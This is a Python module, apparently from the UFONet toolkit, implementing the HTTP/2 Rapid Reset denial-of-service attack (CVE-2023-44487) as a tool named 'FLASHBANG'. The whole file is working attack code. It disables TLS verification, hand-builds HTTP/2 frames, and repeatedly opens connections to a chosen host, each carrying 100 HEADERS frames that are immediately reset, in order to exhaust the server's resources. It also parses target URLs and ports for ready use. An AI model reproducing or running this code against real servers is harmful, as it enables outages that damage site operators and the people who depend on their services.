#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2026 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, socket, ssl, struct, random
from urllib.parse import urlparse

# UFONet HTTP/2 Rapid Reset (FLASHBANG) - CVE-2023-44487
# opens many HEADERS frames then immediately sends RST_STREAM, exhausting backend resources

H2_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'

def _h2_frame(payload, ftype, flags, stream_id):
    return struct.pack('>I', len(payload))[1:] + bytes([ftype, flags]) + struct.pack('>I', stream_id & 0x7fffffff) + payload

def _settings_frame(initial_window=65535):
    body = b''
    return _h2_frame(body, 0x04, 0x00, 0)

def _settings_ack():
    return _h2_frame(b'', 0x04, 0x01, 0)

def _headers_frame(stream_id, hpack_block):
    return _h2_frame(hpack_block, 0x01, 0x05, stream_id)

def _rst_stream(stream_id, error_code=8):
    return _h2_frame(struct.pack('>I', error_code), 0x03, 0x00, stream_id)

def _hpack_get_minimal(authority):
    method_get = b'\x82'
    scheme_https = b'\x87'
    path_root = b'\x84'
    name = b'\x41'
    auth_bytes = authority.encode('utf-8')
    auth_len_h = bytes([len(auth_bytes)]) if len(auth_bytes) < 127 else None
    if auth_len_h is None:
        return method_get + scheme_https + path_root
    return method_get + scheme_https + path_root + name + auth_len_h + auth_bytes

def flashbangize(target_host, target_port, rounds):
    n=0
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2'])
        for x in range(int(rounds)):
            n += 1
            try:
                raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                raw.settimeout(8)
                raw.connect((target_host, target_port))
                sock = ctx.wrap_socket(raw, server_hostname=target_host)
                if sock.selected_alpn_protocol() != 'h2':
                    print("[Info] [AI] [FLASHBANG] Pulse ["+str(n)+"] target did not negotiate HTTP/2 -> [PASSING!]")
                    sock.close()
                    continue
                sock.sendall(H2_PREFACE + _settings_frame() + _settings_ack())
                hpack = _hpack_get_minimal(target_host)
                streams_per_pulse = 100
                buf = b''
                for sid in range(1, streams_per_pulse * 2, 2):
                    buf += _headers_frame(sid, hpack)
                    buf += _rst_stream(sid)
                sock.sendall(buf)
                print("[Info] [AI] [FLASHBANG] Pulse ["+str(n)+"] fired ["+str(streams_per_pulse)+"] HEADERS+RST_STREAM streams -> [HIT!]")
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                sock.close()
            except Exception as e:
                print("[Error] [AI] [FLASHBANG] Pulse ["+str(n)+"] failed: " + type(e).__name__)
    except:
        print("[Error] [AI] [FLASHBANG] Failing to engage... -> Is still target online? -> [Checking!]")

class RAPIDRESET(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] HTTP/2 Rapid Reset (FLASHBANG) is ready to fire: [", rounds, "pulses ]")
        port = 443
        if target.startswith('http://'):
            target = target.replace('http://','')
            port = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
        if '/' in target:
            target = target.split('/', 1)[0]
        if ':' in target:
            target, _p = target.rsplit(':', 1)
            try:
                port = int(_p)
            except Exception:
                pass
        try:
            ip = socket.gethostbyname(target)
        except Exception:
            ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [FLASHBANG] Targeting 'localhost' -> [OK!]\n")
        flashbangize(target, port, rounds)
